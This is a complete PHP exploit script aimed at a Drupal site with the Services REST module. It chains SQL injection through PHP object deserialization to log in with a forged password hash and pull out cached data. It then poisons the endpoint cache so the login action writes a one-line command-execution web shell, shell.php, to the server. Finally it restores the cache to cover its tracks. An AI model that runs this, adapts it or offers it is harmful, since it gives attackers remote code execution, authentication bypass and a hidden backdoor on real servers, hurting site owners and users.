#!/usr/bin/php
<?php

error_reporting(E_ALL);

$url = 'http://10.10.10.9';
$endpoint_url = $url . '/rest';
$endpoint = 'rest_endpoint';
$webshell_name = 'shell.php';
$webshell_data = '<?=`$_GET[0]`;';

function curl_post($url, $type, $data, $data_len) {
    $headers = [
        "Accept: application/json",
        "Content-Type: $type",
        "Content-Length: $data_len",
    ];
    $login_url = $url . '/user/login';

    $s = curl_init();
    curl_setopt($s, CURLOPT_URL, $login_url);
    curl_setopt($s, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($s, CURLOPT_POST, 1);
    curl_setopt($s, CURLOPT_POSTFIELDS, $data);
    curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0);
    $output = curl_exec($s);
    $error = curl_error($s);
    curl_close($s);

    if ($error) {
        die("curl error: $error");
    }
    return json_decode($output);
}

# Stage 1: SQL Injection

class DatabaseCondition {
    protected $conditions = [
        "#conjunction" => "AND"
    ];
    protected $arguments = [];
    protected $changed = false;
    protected $queryPlaceholderIdentifier = null;
    public $stringVersion = null;

    public function __construct($stringVersion=null) {
        $this->stringVersion = $stringVersion;
        if (!isset($stringVersion)) {
            $this->changed = true;
            $this->stringVersion = null;
        }
    }
}

class SelectQueryExtender {
    # Contains a DatabaseCondition object instead of a SelectQueryInterface
    # so that $query->compile() exists and (string) $query is controlled by us.
    protected $query = null;

    protected $uniqueIdentifier = '';
    protected $connection;
    protected $placeholder = 0;

    public function __construct($sql) {
        $this->query = new DatabaseCondition($sql);
    }
}

$cache_id = "services:$endpoint:resources";
$sql_cache = "SELECT data FROM {cache} WHERE cid='$cache_id'";
$password = "password";
$password_hash = '$S$D8JSR7NKJYkNPLZXf3Abz71Q9mF8lX7WH5MLxkbjb2n0HVkFr2mH';

# Take first user but with a custom password
# Store the original password hash in signature_format, and endpoint cache
# in signature
$query = "0x3a) UNION SELECT ux.uid AS uid, " .
    "ux.name AS name, '$password_hash' AS pass, " .
    "ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, " .
    "ux.pass AS signature_format, ux.created AS created, " .
    "ux.access AS access, ux.login AS login, ux.status AS status, " .
    "ux.timezone AS timezone, ux.language AS language, ux.picture " .
    "AS picture, ux.init AS init, ux.data AS data FROM {users} ux " .
    "WHERE ux.uid <>(0";

$query = new SelectQueryExtender($query);
$data = serialize(['username' => $query, 'password' => $password]);
$json = curl_post($endpoint_url, 'application/vnd.php.serialized', $data, strlen($data));

if (!isset($json->user)) {
    print_r($json);
    die("Failed to login with fake password");
}

# Unserialize the cached value

$user = $json->user;
$cache = unserialize($user->signature);
if ($cache === false) {
    die("Unable to obtains endpoint's cache value");
}
$user->pass = $user->signature_format;
unset($user->signature);
unset($user->signature_format);

# Stage 2: Change endpoint's behaviour to write a shell

class DrupalCacheArray {
    # Cache ID
    protected $cid = "services:endpoint_name:resources";
    # Name of the table to fetch data from.
    # Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()
    protected $bin = 'cache';
    protected $keysToPersist = [];
    protected $storage = [];

    function __construct($storage, $endpoint, $controller, $action) {
        $settings = [
            'services' => ['resource_api_version' => '1.0']
        ];
        $this->cid = "services:$endpoint:resources";

        # If no endpoint is given, just reset the original values
        if (isset($controller)) {
            $storage[$controller]['actions'][$action] = [
                'help' => 'Writes data to a file',
                # Callback function
                'callback' => 'file_put_contents',
                # This one does not accept "true" as Drupal does,
                # so we just go for a tautology
                'access callback' => 'is_string',
                'access arguments' => ['a string'],
                # Arguments given through POST
                'args' => [
                    0 => [
                        'name' => 'filename',
                        'type' => 'string',
                        'description' => 'Path to the file',
                        'source' => ['data' => 'filename'],
                        'optional' => false,
                    ],
                    1 => [
                        'name' => 'data',
                        'type' => 'string',
                        'description' => 'The data to write',
                        'source' => ['data' => 'data'],
                        'optional' => false,
                    ],
                ],
                'file' => [
                    'type' => 'inc',
                    'module' => 'services',
                    'name' => 'resources/user_resource',
                ],
                'endpoint' => $settings
            ];
            $storage[$controller]['endpoint']['actions'] += [
                $action => [
                    'enabled' => 1,
                    'settings' => $settings
                ]
            ];
        }

        $this->storage = $storage;
        $this->keysToPersist = array_fill_keys(array_keys($storage), true);
    }
}

class ThemeRegistry Extends DrupalCacheArray {
    protected $persistable;
    protected $completeRegistry;
}

$theme_registry = new ThemeRegistry($cache, $endpoint, 'user', 'login');
$data = serialize([$theme_registry]);
$json = curl_post($endpoint_url, 'application/vnd.php.serialized', $data, strlen($data));

# Write the web shell

$file = ['filename' => $webshell_name, 'data' => $webshell_data];
$data = json_encode($file);
$json = curl_post($endpoint_url, 'application/json', $data, strlen($data));

if (!(isset($json[0]) && $json[0] === strlen($webshell_data))) {
    die("Failed to write file.");
}

$file_url = $url . '/' . $webshell_name;
echo "Web shell successfully written to $file_url" . PHP_EOL;

# Stage 3: Restore endpoint's behaviour

$theme_registry = new ThemeRegistry($cache, $endpoint, null, null);
$data = serialize([$theme_registry]);
curl_post($endpoint_url, 'application/vnd.php.serialized', $data, strlen($data));
?>
